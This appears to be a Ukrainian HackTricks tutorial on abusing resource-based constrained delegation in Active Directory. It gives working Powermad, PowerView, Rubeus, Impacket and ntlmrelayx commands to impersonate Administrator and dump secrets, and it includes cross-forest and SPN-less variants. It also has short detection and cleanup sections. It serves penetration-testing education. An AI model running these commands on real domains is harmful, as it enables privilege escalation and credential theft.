# Делегування з обмеженнями на основі ресурсу

{{#include ../../banners/hacktricks-training.md}}


## Основи делегування з обмеженнями на основі ресурсу

Делегування з обмеженнями на основі ресурсу (RBCD) подібне до [делегування з обмеженнями](constrained-delegation.md), але напрямок довіри протилежний. У традиційному делегуванні з обмеженнями записують, до яких служб принципал може делегувати запити; у RBCD на **цільовому ресурсі** записують, які принципали можуть видавати себе за користувачів для доступу до нього.<sup>[[12]](#references)</sup>

Атрибут _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ цільового об’єкта містить дескриптор безпеки, який визначає принципалів, яким дозволено діяти від імені інших ідентичностей для доступу до цього ресурсу.

Ще одна важлива відмінність полягає в тому, що принципал із достатніми **правами на запис для облікового запису комп’ютера** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` та подібними правами) може мати змогу змінити _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Для налаштування традиційного делегування з обмеженнями зазвичай потрібен привілейований адміністративний доступ.<sup>[[1]](#references)</sup>

Точніше, змінення параметрів класичного делегування з обмеженнями зазвичай вимагає права `SeEnableDelegationPrivilege` на контролері домену, яке зазвичай мають лише адміністратори з високими привілеями. У RBCD рішення перенесене до дескриптора безпеки цільового об’єкта, тому для цього може бути достатньо права на запис у відповідну властивість об’єкта комп’ютера — без цього права користувача.<sup>[[1]](#references)[[2]](#references)</sup>

### Нові поняття

Прапорець **`TrustedToAuthForDelegation`** у `userAccountControl` часто описують як передумову для **S4U2Self**, але це неповний опис.\
Принципал служби з SPN може запитувати S4U2Self і без цього прапорця. Якщо встановлено `TrustedToAuthForDelegation`, отриманий квиток служби буде **forwardable**; без нього квиток зазвичай буде **non-forwardable**.<sup>[[5]](#references)</sup>

Традиційне делегування з обмеженнями відхиляє **non-forwardable TGS** на етапі S4U2Proxy. RBCD може прийняти цей квиток S4U2Self, якщо дескриптор безпеки цільового об’єкта дозволяє запит від цієї служби.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Структура атаки

> Якщо у вас є **права, еквівалентні правам на запис**, для **облікового запису комп’ютера**, ви можете отримати привілейований доступ до цієї машини.

Припустімо, що зловмисник уже має **права, еквівалентні правам на запис, для об’єкта комп’ютера-жертви**.

1. Зловмисник **компрометує** обліковий запис із **SPN** або **створює його** («Service A»). За замовчуванням автентифікований користувач домену може створити до 10 об’єктів комп’ютерів; це обмеження задає **_MachineAccountQuota_**. Об’єкт комп’ютера автоматично надає придатні до використання SPN.
2. Зловмисник **зловживає своїм правом WRITE** для комп’ютера-жертви (ServiceB), щоб налаштувати **делегування з обмеженнями на основі ресурсу, яке дозволяє ServiceA видавати себе за будь-якого користувача** для доступу до цього комп’ютера-жертви (ServiceB).
3. Зловмисник використовує Rubeus для виконання **повної S4U-атаки** (S4U2Self і S4U2Proxy) від Service A до Service B для користувача, **який має привілейований доступ до Service B**.
   1. S4U2Self (з компрометованого або створеного облікового запису SPN): запитати **TGS, що представляє Administrator для Service A** (non-forwardable).
   2. S4U2Proxy: використати цей **non-forwardable TGS**, щоб запитати квиток служби, який представляє **Administrator** для **хоста-жертви**.
   3. Non-forwardable квиток усе ще може працювати в цьому сценарії RBCD, оскільки Service A авторизований у дескрипторі безпеки цільового ресурсу.
4. Зловмисник може виконати **pass-the-ticket** і **видати себе за** користувача, щоб отримати **доступ до ServiceB-жертви**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` блокує стандартний шлях створення об’єктів комп’ютерів, але не скасовує права на запис для цільового об’єкта комп’ютера й не позбавляє контролю над наявним обліковим записом. Іноді як принципал, що виконує делегування, можна використати контрольований звичайний користувацький обліковий запис без SPN через [метод U2U без SPN](#spn-less-cross-domain--cross-forest-rbcd), зокрема в межах одного домену. Для цього шляху все одно потрібні ефективне право на запис RBCD, контроль над обліковими даними користувача, який виконує делегування, ідентичність для видавання за яку не заборонено делегувати, сумісна поведінка шифрування Kerberos і зміна NT-хешу, що порушує роботу облікового запису. Розглядайте ці умови як окремі передумови: порожній атрибут RBCD або нульова квота самі по собі не доводять ані можливість атаки, ані безпеку.

Наявний дескриптор RBCD може також містити **групу**, а не безпосередньо комп’ютер, що виконує делегування. Якщо ви контролюєте обліковий запис комп’ютера зі SPN і можете додати його до цієї групи, нове членство може забезпечити шлях делегування без змінення атрибута RBCD цільового комп’ютера. Перш ніж робити висновок, що цей шлях працює, перевірте ефективний ACL групи для запису членства (включно із заборонними ACE), вкладене членство та оновлення токена, SID довіреної сторони в дескрипторі, обмеження на делегування для облікового запису, за якого видають себе, а також SPN цільової служби.

Щоб перевірити _**MachineAccountQuota**_ домену, можна скористатися:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Атака

### Створення об'єкта комп'ютера

Ви можете створити об'єкт комп'ютера в домені за допомогою **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Налаштування Resource-based Constrained Delegation

**За допомогою модуля PowerShell для Active Directory**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Використання powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Виконання повної S4U attack (Windows/Rubeus)

Спочатку ми створили новий об’єкт Computer із паролем `123456`, тож нам потрібен hash цього пароля:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Це виведе хеші RC4 та AES для цього облікового запису.\
Тепер атаку можна виконати:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Ви можете згенерувати більше квитків для більшої кількості служб, просто запитавши один раз за допомогою параметра `/altservice` у Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Користувачів можна позначити як **"Обліковий запис є чутливим і його не можна делегувати."** Якщо цей прапорець увімкнено, видавати себе за цей обліковий запис через цей механізм делегування неможливо. BloodHound відображає цю властивість під час аналізу.

### Інструменти Linux: RBCD від початку до кінця за допомогою Impacket (2024+)

Якщо ви працюєте з Linux, можете виконати весь ланцюжок RBCD за допомогою офіційних інструментів Impacket:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Нотатки
- Якщо підписування LDAP/LDAPS обов’язкове, використовуйте `impacket-rbcd -use-ldaps ...`.
- Віддавайте перевагу ключам AES: у багатьох сучасних доменах RC4 обмежено. Impacket і Rubeus підтримують сценарії лише з AES.
- Impacket може переписувати `sname` («AnySPN») для деяких інструментів, але за можливості отримуйте правильний SPN (наприклад, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Відбивний RBCD для делегатора лише Kerberos без SPN

Скомпрометований користувач із **`msDS-AllowedToDelegateTo`, але без SPN і `TrustedToAuthForDelegation`**, не може створити forwardable квиток-доказ, потрібний для [обмеженого делегування лише Kerberos](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation), за допомогою звичайного S4U2Self.<sup>[[1]](#references)[[18]](#references)</sup> Якщо цей користувач може записувати атрибут RBCD у власний об’єкт AD, обліковий запис зі SPN, контрольований зловмисником, може спочатку делегувати *цьому користувачу*.<sup>[[1]](#references)[[18]](#references)</sup> Цей перехід RBCD надає forwardable квиток для користувача, якого видають за іншого, до облікового запису без SPN; цей квиток стає доказом для другого S4U2Proxy до SPN зі списку дозволених цілей класичного делегування скомпрометованого облікового запису.<sup>[[18]](#references)[[19]](#references)</sup>

Для першого переходу без SPN запит S4U2Proxy допоміжного облікового запису має використовувати **U2U**: `enc-tkt-in-skey` змушує KDC шифрувати квиток ключем сеансу TGT делегатора, а не шукати ключ SPN.<sup>[[18]](#references)[[19]](#references)</sup> KDC також потрібні біт RBCD у `PA-PAC-OPTIONS`, TGT делегатора та квиток-доказ S4U2Self.<sup>[[18]](#references)[[20]](#references)</sup> У форку Impacket `getST.py` автора додано параметри `-nospn` і `-tgt` для цього запиту; підтримка `-nospn`/`-tgt` є в upstream PR #2324 для Impacket, тому для цього кроку використовуйте форк за посиланням, а не припускайте, що стандартний `getST.py` його підтримує.<sup>[[18]](#references)[[20]](#references)</sup>

У цьому прикладі припускається, що обліковий запис `svc_web` скомпрометовано, він може змінювати власний атрибут RBCD і має право делегувати до `host/dc01.corp.local`. Також припускається, що можна створити допоміжний обліковий запис зі SPN, RC4 дозволено, а вибраний обліковий запис `Administrator` допускає делегування. Запросіть **TGT RC4**, використавши NT-хеш скомпрометованого облікового запису. Виконайте перший `getST.py` із форку автора; перегляньте вивід `describeTicket.py` і підставте наведений у ньому **ключ сеансу TGT RC4** нижче. Для останнього `getST.py` можна використати стандартний Impacket. Запросіть TGT **до** зміни NT-хешу: ця зміна порушить роботу службового облікового запису, доки його пароль не буде скинуто.<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

```bash
pypykatz crypto nt 'OldPass!'
getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
describeTicket.py svc_web.ccache
addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
```

На відміну від [маршруту RBCD без SPN нижче](#spn-less-cross-domain--cross-forest-rbcd), у цьому ланцюжку обліковий запис без SPN використовується як **ціль RBCD, а потім — як делегатор класичного KCD**. Для цього також потрібен інший контрольований обліковий запис із SPN. Якщо `MachineAccountQuota=0`, замість нового комп’ютера можна використати вже контрольований обліковий запис із SPN; нульова квота сама по собі не перешкоджає цьому способу.<sup>[[18]](#references)[[19]](#references)</sup>

## Міждоменний RBCD і RBCD між лісами

Якщо контрольований вами **суб’єкт, що делегує**, належить до **іншого домену** (або навіть до **іншого лісу**), ніж **комп’ютер-ресурс**, зловживання все одно є **RBCD**, але потік квитків уже не відповідає звичній схемі `S4U2Self -> S4U2Proxy` в межах одного домену.

### Міждоменний RBCD: налаштування зовнішнього суб’єкта за SID

Коли ви задаєте `msDS-AllowedToActOnBehalfOfOtherIdentity` з **іншого домену**, зовнішній комп’ютер/користувач може бути **недоступним для пошуку за ім’ям** у LDAP цільового домену. У такому разі налаштуйте запис делегування за допомогою **SID** зовнішнього суб’єкта, а не його sAMAccountName/UPN.

Це особливо актуально під час ретрансляції NTLM до LDAP за допомогою `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Примітки:
- `--sid` вказує `ntlmrelayx.py` трактувати `--escalate-user` як SID. Це потрібно, коли обліковий запис, що делегує, належить до зовнішнього домену щодо цільового.
- Навіть якщо інструмент виводить `User not found in LDAP`, запис делегування все одно може пройти успішно, оскільки дескриптор безпеки безпосередньо зберігає зовнішній SID.

### Міждоменний RBCD: послідовність cross-realm S4U

Щойно зовнішній принципал з’являється в `msDS-AllowedToActOnBehalfOfOtherIdentity`, робочий міждоменний процес виглядає так:<sup>[[9]](#references)[[13]](#references)</sup>

1. Отримайте **TGT** для принципала, що делегує, у його власному домені.
2. Запросіть **referral TGT** для `krbtgt/<target-domain>`.
3. Запросіть **cross-realm S4U2Self referral** для користувача, що видається за іншого, на контролері цільового домену.
4. Запросіть фактичний квиток **S4U2Self** для цього користувача у домені принципала, що делегує.
5. Виконайте **S4U2Proxy** у домені принципала, що делегує, щоб отримати referral-квиток для цільового домену.
6. Виконайте фінальний **S4U2Proxy** на контролері цільового домену, щоб отримати квиток служби для `cifs/host.target`, `host/host.target` тощо.

Саме тому стандартні Linux-інструменти часто не працюють із міждоменним RBCD:<sup>[[9]](#references)</sup>
- **realm** запиту може відрізнятися від realm TGT, використаного в `TGS-REQ`
- ланцюжок потребує **окремих кроків S4U2Proxy**, а не лише `S4U2Self` чи `S4U2Self`, за яким одразу виконується один `S4U2Proxy`

### Міждоменний RBCD із Linux

Synacktiv опублікувала реалізацію `getST.py` для Impacket, яка відтворює послідовність cross-realm у Linux, обробляючи обидва KDC окремо:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Операційно нові аргументи такі:
- `-dc-ip`: DC домену, що **делегує**
- `-targetdomain`: домен **комп’ютера-ресурсу**
- `-targetdc`: DC домену **ресурсу**

### Обмеження RBCD між лісами

RBCD між лісами має важливе обмеження: **користувач, якого видають за іншого, має належати до того самого лісу, що й principal, який делегує**. Іншими словами, якщо контрольований вами обліковий запис комп’ютера розташований у `valhalla.local`, а цільовий ресурс — у `asgard.local`, зазвичай ви **не можете** видавати себе за довільних користувачів `asgard.local` для доступу до цього ресурсу через RBCD.<sup>[[9]](#references)</sup>

Це все одно можна експлуатувати, якщо:
- користувач із **лісу, що делегує**, є **локальним адміністратором** (або має інші привілеї) на хості ресурсу в іншому лісі
- trust дозволяє потрібний шлях автентифікації, а foreign SID приймається в дескрипторі безпеки цільового комп’ютера

### Особливості протоколу RBCD між лісами

RBCD між лісами — це не просто «міждоменна операція плюс trust». Спостережуваний процес має дві особливості, які традиційно не враховують поширені інструменти:<sup>[[9]](#references)</sup>

1. Додатковий запит **S4U2Proxy**, у якому встановлено **`PA-PAC-OPTIONS=branch-aware`**
2. Квиток служби наприкінці може бути повернутий із використанням **RC4**, навіть якщо було запитано інші etype

Практичний процес:

1. Отримати TGT для principal, що делегує, у лісі A.
2. Запросити **S4U2Self** для користувача, якого видають за іншого, у лісі A.
3. Запросити **S4U2Proxy** у лісі A, щоб отримати referral TGT для лісу B.
4. Надіслати другий запит **S4U2Proxy** у лісі A **без** квитка S4U2Self як додаткового квитка, але з увімкненим `branch-aware`, щоб отримати ще один referral TGT для лісу B.
5. За бажанням запросити звичайний квиток служби в лісі B для principal, що делегує (цей квиток не потрібен для фінального зловживання).
6. Використати referral-квитки з кроків 3 і 4, щоб запросити фінальний квиток **S4U2Proxy** у лісі B для користувача з лісу A, якого видають за іншого, до цільового SPN.

### RBCD між лісами з Linux

У тій самій гілці Synacktiv Impacket додано перемикач `-forest` для цієї логіки:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Рекурсивний multi-domain RBCD (3+ domains)

У **multi-domain forests** і **S4U2Self**, і **S4U2Proxy** можуть виконуватися **рекурсивно**, а не зупинятися після одного referral:

- **Рекурсивний S4U2Self**: перший `S4U2Self` надсилається до **домену користувача, від імені якого здійснюється impersonation**; проміжні переходи між батьківськими та дочірніми доменами проходять за допомогою звичайних referrals `TGS-REQ` для `krbtgt/<REALM>`, а **фінальний `S4U2Self`** надсилається у **власному домені delegating principal**.
- Це означає, що **достатньо лише мати TGT** для облікового запису комп’ютера, щоб здійснити impersonation **адміністратора з іншого домену в тому самому forest** і запросити `cifs/host`, `host/host`, `wsman/host` тощо.
- **Рекурсивний S4U2Proxy** проходить ланцюг довіри так само: проміжні переходи повторно використовують попередній ticket як TGT, запитуючи referral `krbtgt/<REALM>` для наступного домену; лише останній перехід повертає фінальний service ticket.<sup>[[10]](#references)</sup>

Практичний приклад у межах одного forest:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### RBCD без SPN між доменами / лісами

Якщо **делегувальний principal — це користувач без SPN**, останній рекурсивний запит `S4U2Self` завершується помилкою **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Обхідний шлях — **повторити лише останній крок як `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Короткий опис ланцюжка зловживання:

1. Автентифікуйтеся за допомогою **NT-хешу**, щоб спрямувати KDC до використання **RC4-HMAC (etype 23)**.
2. Спочатку надішліть запит **`-self -u2u`** і збережіть цей квиток окремо від подальшого кроку proxy.
3. Витягніть **ключ сеансу TGT** за допомогою `describeTicket.py`.
4. Замініть **NT-хеш** користувача цим **ключем сеансу**, використовуючи `changepasswd.py -newhashes <session_key>`.
5. Повторно використайте квиток `S4U2Self+U2U` як **`-additional-ticket`** під час окремого запиту **`-proxy`**.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Операційні застереження:

- Якщо **перший довірений перехід уже веде до іншого лісу**, надавайте перевагу **branch-aware** алгоритму (`getST.py ... -forest`), щоб відповідати нативній поведінці Windows. Якщо до зовнішнього лісу в ланцюжку доходять лише **пізніше**, рекурсивний процес без урахування гілок усе ще може працювати.<sup>[[9]](#references)</sup>
- На нових контролерах домену **Windows Server 2022/2025** примусове використання RC4 може завершитися помилкою **`KDC_ERR_ETYPE_NOSUPP`** через застарівання RC4; через це **RBCD без SPN може бути неможливим**, хоча класичний RBCD із прив’язаним SPN усе ще працює з AES.<sup>[[15]](#references)</sup>
- Запускайте **`S4U2Self+U2U` до зміни хешу/пароля користувача**: **`SamrChangePasswordUser`** не перераховує AES-ключі Kerberos облікового запису, тому попередня зміна пароля може порушити подальші запити квитків.<sup>[[14]](#references)</sup>
- Обліковий запис, який видає себе за іншого, має й надалі **дозволяти делегування**: **Protected Users** та облікові записи з атрибутом **`NOT_DELEGATED`** / прапорцем **"Account is sensitive and cannot be delegated"** блокують цей ланцюжок.

## Примітки щодо виявлення / посилення захисту

- Шляхи RBCD між доменами/лісами зазвичай і далі створюються через **зловживання ACL** або **relay-to-LDAP**. Увімкніть **підписування LDAP** і **прив’язування каналу LDAP** на контролерах домену, щоб заблокувати поширені способи їх створення.
- Перевірте, хто має право записувати `msDS-AllowedToActOnBehalfOfOtherIdentity` в об’єкти комп’ютерів, і визначте відповідні SID, зокрема **foreign security principals**.
- У середовищах із великою кількістю довірчих відносин перевірте **Selective Authentication**, **фільтрацію SID** та наявність у користувачів із зовнішнього лісу прав **локального адміністратора** на хостах із ресурсами.

### Доступ

Останній командний рядок виконає **повну S4U-атаку та інжектує TGS** від Administrator на хост-жертву в **пам’ять**.\
У цьому прикладі для Administrator було запитано TGS для служби **CIFS**, тож ви зможете отримати доступ до **C$**:

```bash
ls \\victim.domain.local\C$
```

### Зловживання різними service tickets

Дізнайтеся про [**доступні service tickets тут**](silver-ticket.md#available-services).

## Перелічення, аудит і очищення

### Перелічення комп’ютерів із налаштованим RBCD

PowerShell (декодування SD для визначення SID):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (прочитати або очистити однією командою):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Очищення / скидання RBCD

- PowerShell (очистити атрибут):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Помилки Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Це означає, що Kerberos налаштовано не використовувати DES або RC4, а ви передаєте лише хеш RC4. Передайте Rubeus щонайменше хеш AES256 (або просто передайте йому хеші rc4, aes128 і aes256). Приклад: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** під час `-self` для звичайного користувача: імовірно, делегуючий principal **не має SPN**. Повторіть **останній перехід**, використавши **`S4U2Self+U2U`** замість звичайного `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** під час **RBCD без SPN**: останні версії DC можуть відхиляти примусовий шлях **RC4-HMAC**, необхідний для трюку з `S4U2Self+U2U` і підміною ключа сеансу. Спробуйте класичний шлях **RBCD із прив’язкою до SPN**, використовуючи AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Це означає, що час на поточному комп’ютері відрізняється від часу на DC, через що Kerberos працює некоректно.
- **`preauth_failed`**: Це означає, що вказані ім’я користувача й хеші не працюють для входу. Можливо, ви забули додати `$` до імені користувача під час створення хешів (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`** під час S4U2Proxy: Перевірте обмеження делегування для імперсонованого облікового запису, прапорець forwardable у квитку-доказі, а також те, чи дозволяє цей перехід класичний KCD або дескриптор RBCD цільового об’єкта. Це **помилка політики делегування KDC**, а не перевірка того, чи запущена цільова служба або чи має користувач доступ на рівні застосунку. Незареєстрований цільовий SPN зазвичай призводить до **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**.<sup>[[21]](#references)[[22]](#references)</sup>

## Примітки, relay та альтернативи

- Також можна записати RBCD SD через AD Web Services (ADWS), якщо LDAP фільтрується. Дивіться:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Ланцюжки relay Kerberos часто завершуються RBCD, щоб за один крок отримати локальний SYSTEM. Практичні приклади від початку до кінця:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Якщо підписування LDAP і channel binding **вимкнені**, а ви можете створити обліковий запис комп’ютера, такі інструменти, як **KrbRelayUp**, можуть передати примусово викликану автентифікацію Kerberos через relay до LDAP, встановити `msDS-AllowedToActOnBehalfOfOtherIdentity` для облікового запису вашого комп’ютера в об’єкті цільового комп’ютера й одразу імперсонувати **Administrator** через S4U з іншого хоста.<sup>[[8]](#references)</sup>

## References

- [1] [Виляючи собакою: зловживання делегуванням з обмеженнями на основі ресурсів для атаки на Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Ще одне слово про делегування – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Делегування Kerberos з обмеженнями на основі ресурсів: захоплення об’єкта комп’ютера](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – зловживання делегуванням з обмеженнями на основі ресурсів](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity вбила домен: огляд атак на Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (офіційна версія)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Коротка шпаргалка для Linux із нещодавнім синтаксисом](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (підписування LDAP вимкнено → relay Kerberos до RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv — дослідження RBCD між доменами та лісами](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv — дослідження RBCD між доменами та лісами: частина 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Гілка Impacket від Synacktiv — cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn — огляд делегування Kerberos з обмеженнями](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Специфікації Microsoft Open — S4U2Self між доменами](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Специфікації Microsoft Open — SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn — виявлення та усунення використання RC4 у Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Специфікації Microsoft Open — подробиці S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
- [17] [James Forshaw — експлуатація RBCD зі звичайним обліковим записом користувача](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [18] [Hunter Wade — зловживання делегуванням з обмеженнями без переходу протоколу для облікових записів без SPN](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
